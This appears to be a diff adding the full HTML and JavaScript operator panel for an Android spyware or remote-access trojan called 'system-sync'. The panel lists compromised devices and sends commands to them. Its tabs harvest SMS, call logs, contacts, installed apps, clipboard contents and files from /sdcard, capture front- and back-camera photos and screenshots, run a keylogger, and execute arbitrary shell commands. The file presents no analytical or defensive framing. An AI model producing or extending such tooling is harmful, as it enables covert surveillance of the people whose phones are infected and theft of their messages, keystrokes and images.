@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>system-sync — Admin</title>
+<style>
+  * { box-sizing: border-box; margin: 0; }
+  body { font-family: 'SF Mono', Menlo, Consolas, monospace; background: #0a0a0f; color: #e0e0e0; height: 100vh; display: flex; }
+  aside { width: 280px; background: #12121a; border-right: 1px solid #1e1e2e; padding: 16px; overflow-y: auto; }
+  main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+  h1 { font-size: 16px; color: #00ff9d; letter-spacing: 2px; margin-bottom: 16px; }
+  h2 { font-size: 11px; color: #7c7cff; text-transform: uppercase; margin: 16px 0 8px; }
+  .dev { padding: 10px; background: #1a1a24; border: 1px solid #2e2e3e; border-radius: 4px; margin-bottom: 8px; cursor: pointer; font-size: 12px; }
+  .dev:hover { border-color: #00ff9d; }
+  .dev.active { border-color: #00ff9d; background: #1a2a24; }
+  .dev .id { color: #00ff9d; font-weight: bold; }
+  .dev .meta { color: #666; font-size: 10px; margin-top: 4px; }
+  .tab-bar { display: flex; border-bottom: 1px solid #1e1e2e; background: #12121a; flex-wrap: wrap; }
+  .tab { padding: 10px 18px; cursor: pointer; font-size: 12px; color: #888; border-bottom: 2px solid transparent; }
+  .tab.active { color: #00ff9d; border-bottom-color: #00ff9d; }
+  .pane { display: none; flex: 1; overflow: auto; padding: 16px; }
+  .pane.active { display: block; }
+  button { background: #1e1e2e; color: #e0e0e0; border: 1px solid #2e2e3e; padding: 7px 14px; border-radius: 4px; cursor: pointer; font-family: inherit; font-size: 11px; margin: 4px 4px 4px 0; }
+  button:hover { background: #00ff9d; color: #0a0a0f; border-color: #00ff9d; }
+  table { width: 100%; border-collapse: collapse; font-size: 12px; }
+  th, td { text-align: left; padding: 6px 8px; border-bottom: 1px solid #1e1e2e; }
+  th { color: #7c7cff; font-size: 10px; text-transform: uppercase; }
+  pre { background: #0a0a0f; padding: 12px; border: 1px solid #1e1e2e; border-radius: 4px; overflow: auto; font-size: 11px; color: #888; max-height: 500px; white-space: pre-wrap; }
+  #logs { position: fixed; bottom: 0; right: 0; width: 320px; height: 200px; background: #0a0a0f; border: 1px solid #1e1e2e; border-radius: 4px 0 0 0; padding: 8px; overflow-y: auto; font-size: 10px; color: #888; }
+  #logs .ok { color: #00ff9d; }
+  #logs .err { color: #ff5577; }
+  #logs .info { color: #7c7cff; }
+  .cam-wrap img { max-width: 100%; max-height: 400px; border: 1px solid #1e1e2e; border-radius: 4px; margin: 8px 4px 0 0; }
+  input { background: #0a0a0f; border: 1px solid #2e2e3e; color: #e0e0e0; padding: 6px 10px; border-radius: 4px; font-family: inherit; font-size: 11px; width: 100%; max-width: 400px; }
+  .empty { color: #444; font-style: italic; text-align: center; padding: 40px; }
+</style>
+</head>
+<body>
+<aside>
+  <h1>SYSTEM-SYNC</h1>
+  <h2>Devices</h2>
+  <div id="devices"></div>
+  <h2>Panel</h2>
+  <div style="font-size:11px;color:#666"><span id="me" style="color:#00ff9d"></span></div>
+</aside>
+<main>
+  <div class="tab-bar" id="tabs">
+    <div class="tab active" data-pane="dash">Dashboard</div>
+    <div class="tab" data-pane="sms">SMS</div>
+    <div class="tab" data-pane="calls">Calls</div>
+    <div class="tab" data-pane="contacts">Contacts</div>
+    <div class="tab" data-pane="apps">Apps</div>
+    <div class="tab" data-pane="camera">Camera</div>
+    <div class="tab" data-pane="screen">Screenshots</div>
+    <div class="tab" data-pane="clip">Clipboard</div>
+    <div class="tab" data-pane="files">Files</div>
+    <div class="tab" data-pane="keylog">Keylogger</div>
+    <div class="tab" data-pane="term">Shell</div>
+  </div>
+  <div class="pane active" id="pane-dash">
+    <h2>Quick Actions</h2>
+    <button onclick="cmd('ping')">Ping</button>
+    <button onclick="cmd('info')">Info</button>
+    <button onclick="cmd('sms')">SMS</button>
+    <button onclick="cmd('calls')">Calls</button>
+    <button onclick="cmd('contacts')">Contacts</button>
+    <button onclick="cmd('apps')">Apps</button>
+    <h2>Raw Response</h2>
+    <pre id="raw">select a device</pre>
+  </div>
+  <div class="pane" id="pane-sms"><button onclick="cmd('sms')">Refresh</button><table id="tbl-sms"><thead><tr><th>Address</th><th>Body</th><th>Date</th></tr></thead><tbody></tbody></table></div>
+  <div class="pane" id="pane-calls"><button onclick="cmd('calls')">Refresh</button><table id="tbl-calls"><thead><tr><th>Number</th><th>Type</th><th>Duration</th><th>Date</th></tr></thead><tbody></tbody></table></div>
+  <div class="pane" id="pane-contacts"><button onclick="cmd('contacts')">Refresh</button><table id="tbl-contacts"><thead><tr><th>Name</th><th>Phone</th></tr></thead><tbody></tbody></table></div>
+  <div class="pane" id="pane-apps"><button onclick="cmd('apps')">Refresh</button><table id="tbl-apps"><thead><tr><th>App</th><th>Package</th></tr></thead><tbody></tbody></table></div>
+  <div class="pane" id="pane-camera"><button onclick="cmd('camera', {camera:'back'})">Back</button><button onclick="cmd('camera', {camera:'front'})">Front</button><div class="cam-wrap" id="cam-images"></div></div>
+  <div class="pane" id="pane-screen"><button onclick="cmd('screenshot')">Screenshot</button><div class="cam-wrap" id="screen-images"></div></div>
+  <div class="pane" id="pane-clip"><button onclick="cmd('clipboard')">Read</button><pre id="clip-content">empty</pre></div>
+  <div class="pane" id="pane-files"><input id="files-path" value="/sdcard" /><button onclick="cmd('files', {path: document.getElementById('files-path').value})">List</button><table id="tbl-files"><thead><tr><th>Name</th><th>Type</th><th>Size</th></tr></thead><tbody></tbody></table></div>
+  <div class="pane" id="pane-keylog"><button onclick="cmd('keylog:start')">Start</button><button onclick="cmd('keylog:stop')">Stop</button><button onclick="document.getElementById('keylog-out').textContent=''">Clear</button><pre id="keylog-out"></pre></div>
+  <div class="pane" id="pane-term"><input id="term-cmd" placeholder="shell command" /><button onclick="cmd('shell', {command: document.getElementById('term-cmd').value})">Run</button><pre id="term-out">output...</pre></div>
+</main>
+<div id="logs"></div>
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const socket = io({ query: { role: 'admin' } });
+let selectedDevice = null, devices = [];
+const $ = (id) => document.getElementById(id);
+function log(msg, cls) {
+  const d = document.createElement('div'); d.className = cls || '';
+  d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+  $('logs').appendChild(d); $('logs').scrollTop = $('logs').scrollHeight;
+}
+socket.on('connect', () => { $('me').textContent = 'admin:' + socket.id.slice(0,8); log('connected', 'ok'); });
+socket.on('devices:update', (list) => { devices = list; renderDevices(); });
+socket.on('log', ({deviceId, payload}) => {
+  if (deviceId === selectedDevice) $('raw').textContent = JSON.stringify(payload, null, 2);
+  log(`${deviceId}: ${JSON.stringify(payload).slice(0, 80)}`, payload.success ? 'ok' : 'err');
+  refreshPane(deviceId, payload);
+});
+socket.on('screenshot:new', ({deviceId, file}) => {
+  if (deviceId !== selectedDevice) return;
+  const img = document.createElement('img');
+  img.src = `/uploads/${file}`;
+  img.onclick = () => window.open(img.src, '_blank');
+  $('cam-images').prepend(img.cloneNode());
+  $('screen-images').prepend(img);
+});
+socket.on('keylog:new', ({deviceId, text}) => {
+  if (deviceId !== selectedDevice) return;
+  $('keylog-out').textContent += text;
+});
+function renderDevices() {
+  const c = $('devices');
+  if (!devices.length) { c.innerHTML = '<div class="empty">no devices</div>'; return; }
+  c.innerHTML = '';
+  for (const d of devices) {
+    const el = document.createElement('div');
+    el.className = 'dev' + (selectedDevice === d.id ? ' active' : '');
+    el.innerHTML = `<div class="id">${d.id}</div><div class="meta">${d.info.model || 'unknown'} · ${new Date(d.lastSeen).toLocaleTimeString()}</div>`;
+    el.onclick = () => { selectedDevice = d.id; renderDevices(); loadAllFor(d.id); log('selected ' + d.id, 'info'); };
+    c.appendChild(el);
+  }
+}
+async function loadAllFor(id) {
+  for (const type of ['sms','calls','contacts','apps']) {
+    try { const r = await fetch(`/api/data/${id}/${type}`); fillPane(type, await r.json()); } catch {}
+  }
+}
+function cmd(request, extras = {}) {
+  if (!selectedDevice) return log('no device', 'err');
+  fetch('/api/cmd', { method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ deviceId: selectedDevice, request, extras })
+  }).then(r => r.json()).then(j => log(`→ ${request}: ${j.success ? 'ok' : 'fail'}`, j.success ? 'ok' : 'err'));
+}
+function refreshPane(deviceId, payload) {
+  if (deviceId !== selectedDevice) return;
+  const type = payload.type || '';
+  if (type === 'clipboard') $('clip-content').textContent = payload.data || 'empty';
+  if (type === 'shell') $('term-out').textContent = payload.data || '';
+  if (['files','sms','calls','contacts','apps'].includes(type)) fillPane(type, payload.data);
+}
+function fillPane(type, data) {
+  const tbody = document.querySelector(`#tbl-${type} tbody`);
+  if (!tbody || !Array.isArray(data)) return;
+  tbody.innerHTML = '';
+  for (const row of data) {
+    const tr = document.createElement('tr');
+    for (const v of Object.values(row)) {
+      const td = document.createElement('td'); td.textContent = String(v ?? ''); tr.appendChild(td);
+    }
+    tbody.appendChild(tr);
+  }
+}
+document.querySelectorAll('.tab').forEach(t => {
+  t.onclick = () => {
+    document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
+    document.querySelectorAll('.pane').forEach(x => x.classList.remove('active'));
+    t.classList.add('active'); $('pane-' + t.dataset.pane).classList.add('active');
+  };
+});
+</script>
+</body>
+</html>
